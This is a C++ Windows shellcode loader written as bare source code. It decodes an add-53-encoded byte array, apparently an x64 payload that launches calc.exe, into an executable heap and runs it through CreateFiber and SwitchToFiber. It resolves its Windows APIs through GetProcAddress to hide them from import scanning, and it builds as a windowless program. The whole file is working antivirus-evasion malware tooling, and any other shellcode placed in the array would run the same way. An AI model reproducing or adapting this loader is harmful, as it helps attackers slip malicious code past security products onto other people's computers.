#include <iostream>
#include <Windows.h>

typedef BOOL(WINAPI* pfnVirtualProtect)(
	IN  LPVOID lpAddress,
	IN  SIZE_T dwSize,
	IN  DWORD  flNewProtect,
	OUT PDWORD lpflOldProtect
	);

typedef LPVOID(WINAPI* pfnCreateFiber)(
	IN          SIZE_T                dwStackSize,
	IN          LPFIBER_START_ROUTINE lpStartAddress,
	IN OPTIONAL	LPVOID                lpParameter
	);

typedef void (WINAPI* pfnSwitchToFiber)(
	IN OPTIONAL LPVOID lpParameter
	);

typedef LPVOID(WINAPI* pfnConvertThreadToFiber)(
	IN OPTIONAL LPVOID lpParameter
	);


typedef HANDLE(WINAPI* pfnHeapCreate)(
	IN DWORD	flOptions,
	IN SIZE_T	dwInitialSize,
	IN SIZE_T	dwMaximumSize
	);

typedef LPVOID(WINAPI* pfnHeapAlloc)(
	IN	HANDLE	hHandle,
	IN	DWORD	dwFlags,
	IN	SIZE_T	dwBytes
	);

unsigned char buf[] = "\x31\x7d\xb8\x19\x25\x1d\xf5\x35\x35\x35\x76\x86\x76\x85\x87\x86\x8b\x7d\x66\x07\x9a\x7d\xc0\x87\x95\x7d\xc0\x87\x4d\x7d\xc0\x87\x55\x7d\xc0\xa7\x85\x7d\x44\xec\x7f\x7f\x82\x66\xfe\x7d\x66\xf5\xe1\x71\x96\xb1\x37\x61\x55\x76\xf6\xfe\x42\x76\x36\xf6\x17\x22\x87\x76\x86\x7d\xc0\x87\x55\xc0\x77\x71\x7d\x36\x05\xc0\xb5\xbd\x35\x35\x35\x7d\xba\xf5\xa9\x9c\x7d\x36\x05\x85\xc0\x7d\x4d\x79\xc0\x75\x55\x7e\x36\x05\x18\x8b\x7d\x34\xfe\x76\xc0\x69\xbd\x7d\x36\x0b\x82\x66\xfe\x7d\x66\xf5\xe1\x76\xf6\xfe\x42\x76\x36\xf6\x6d\x15\xaa\x26\x81\x38\x81\x59\x3d\x7a\x6e\x06\xaa\x0d\x8d\x79\xc0\x75\x59\x7e\x36\x05\x9b\x76\xc0\x41\x7d\x79\xc0\x75\x51\x7e\x36\x05\x76\xc0\x39\xbd\x7d\x36\x05\x76\x8d\x76\x8d\x93\x8e\x8f\x76\x8d\x76\x8e\x76\x8f\x7d\xb8\x21\x55\x76\x87\x34\x15\x8d\x76\x8e\x8f\x7d\xc0\x47\x1e\x8c\x34\x34\x34\x92\x7d\xef\x36\x35\x35\x35\x35\x35\x35\x35\x7d\xc2\xc2\x36\x36\x35\x35\x76\xef\x66\xc0\xa4\xbc\x34\x0a\xf0\x25\xea\xd7\x8b\x76\xef\xdb\xca\xf2\xd2\x34\x0a\x7d\xb8\xf9\x5d\x71\x3b\xb1\x3f\xb5\x30\x15\xaa\x3a\xf0\x7c\x48\xa7\xa4\x9f\x35\x8e\x76\xbe\x0f\x34\x0a\x98\x96\xa1\x98\x63\x9a\xad\x9a\x35\x35";
SIZE_T bufSize = sizeof(buf);

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine, INT nCmdShow) {
//int main() {

	pfnVirtualProtect pVirtualProtect	= (pfnVirtualProtect)GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "VirtualProtect");
	pfnCreateFiber pCreateFiber			= (pfnCreateFiber)GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "CreateFiber");
	pfnSwitchToFiber pSwitchToFiber		= (pfnSwitchToFiber)GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "SwitchToFiber");
	pfnConvertThreadToFiber pConvertThreadToFiber = (pfnConvertThreadToFiber)GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "ConvertThreadToFiber");
	pfnHeapCreate pHeapCreate			= (pfnHeapCreate)GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "HeapCreate");
	pfnHeapAlloc pHeapAlloc				= (pfnHeapAlloc)GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "HeapAlloc");

	LPVOID cFiber = NULL;
	LPVOID hAlloc = NULL;

	PVOID hHandle = pHeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, bufSize);

	// Convert current thread to fiber
	LPVOID ThreadToFiber = pConvertThreadToFiber(NULL);

	hAlloc = pHeapAlloc(hHandle, HEAP_ZERO_MEMORY, bufSize);

	for (int i = 0; i < bufSize; i++) {
		buf[i] = (unsigned char)(((unsigned int)buf[i] - 53) & 0xFF);
	}

	memmove_s(hAlloc, bufSize, buf, bufSize);

	cFiber = pCreateFiber(NULL, (LPFIBER_START_ROUTINE)hAlloc, NULL);
	if (cFiber == NULL) { return -2; }

	DWORD oldProtection = 0;
	if (!pVirtualProtect(hAlloc, bufSize, PAGE_EXECUTE, &oldProtection)) { return -2; };

	pSwitchToFiber(cFiber);

	return 0;
}